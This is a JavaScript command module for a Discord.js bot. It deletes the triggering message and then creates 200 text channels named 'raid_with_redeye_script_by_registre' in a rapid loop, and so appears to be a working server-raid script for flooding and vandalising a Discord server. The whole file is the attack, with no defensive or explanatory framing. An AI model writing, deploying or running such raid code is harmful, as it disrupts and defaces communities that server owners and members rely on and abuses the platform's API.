const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js");

module.exports = {
    name: "mc",
    run: async (client, message, args) => {
        if (message.deletable) message.delete();
        var i;
        for (i = 0; i < 200; i++) {
        setTimeout(() => {
      
          message.guild.channels.create('raid_with_redeye_script_by_registre',{type: 'text'})
            .then(console.log)
            .catch(console.error);
      
        },1*1) //3 secondes
        
    }
}
}